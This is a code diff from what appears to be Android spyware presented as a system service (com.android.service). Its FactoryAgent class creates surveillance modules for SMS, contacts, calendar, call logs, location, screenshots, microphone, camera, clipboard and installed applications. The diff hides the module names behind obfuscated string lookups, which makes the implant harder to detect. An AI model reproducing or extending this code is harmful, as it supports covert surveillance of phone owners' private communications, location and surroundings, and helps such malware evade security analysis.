@@ -9,6 +9,8 @@
 
 package com.android.service.module;
 
+import com.android.service.Messages;
+import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.interfaces.AbstractFactory;
 import com.android.service.util.Check;
@@ -27,39 +29,46 @@ public class FactoryAgent implements AbstractFactory<BaseModule, String> {
 	public BaseModule create(String type, String subtype) {
 		BaseModule a = null;
 
-		if("sms".equals(type)){
+		if (Messages.getString("b.0").equals(type)) { //$NON-NLS-1$
 			a = new ModuleMessage();
-		}else if("addressbook".equals(type)){
+		} else if (Messages.getString("b.1").equals(type)) { //$NON-NLS-1$
 			a = new ModuleAddressBook();
-		}else if("calendar".equals(type)){
+		} else if (Messages.getString("b.2").equals(type)) { //$NON-NLS-1$
 			a = new ModuleCalendar();
-		}else if("calllist".equals(type)){
-			a = new ModuleCallList();
-		}else if("device".equals(type)){
+		} else if (Messages.getString("b.3").equals(type) || Messages.getString("b.4").equals(type)) { // Alias //$NON-NLS-1$ //$NON-NLS-2$
+																		// per
+																		// la
+																		// 8.0
+			if (Status.calllistCreated == false) {
+				a = new ModuleCallList();
+				Status.calllistCreated = true;
+			}
+		} else if (Messages.getString("b.5").equals(type)) { //$NON-NLS-1$
 			a = new ModuleDevice();
-		}else if("position".equals(type)){
+		} else if (Messages.getString("b.6").equals(type)) { //$NON-NLS-1$
 			a = new ModulePosition();
-		}else if("snapshot".equals(type)){
+		} else if (Messages.getString("b.7").equals(type) || Messages.getString("b.8").equals(type)) { // 7.6 //$NON-NLS-1$ //$NON-NLS-2$
+																			// ->
+																			// 8.0
 			a = new ModuleSnapshot();
-		}else if("messages".equals(type)){
+		} else if (Messages.getString("b.9").equals(type)) { //$NON-NLS-1$
 			a = new ModuleMessage();
-		}else if("mic".equals(type)){
+		} else if (Messages.getString("b.10").equals(type)) { //$NON-NLS-1$
 			a = new ModuleMic();
-		}else if("camera".equals(type)){
+		} else if (Messages.getString("b.11").equals(type)) { //$NON-NLS-1$
 			a = new ModuleCamera();
-		}else if("clipboard".equals(type)){
+		} else if (Messages.getString("b.12").equals(type)) { //$NON-NLS-1$
 			a = new ModuleClipboard();
-		}else if("crisis".equals(type)){
+		} else if (Messages.getString("b.13").equals(type)) { //$NON-NLS-1$
 			a = new ModuleCrisis();
-		}else if("application".equals(type)){
+		} else if (Messages.getString("b.14").equals(type)) { //$NON-NLS-1$
 			a = new ModuleApplication();
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (factory), unknown type: " + type) ;//$NON-NLS-1$
+				Check.log(TAG + " Error (factory), unknown type: " + type);//$NON-NLS-1$
 			}
 		}
 
 		return a;
 	}
-
 }
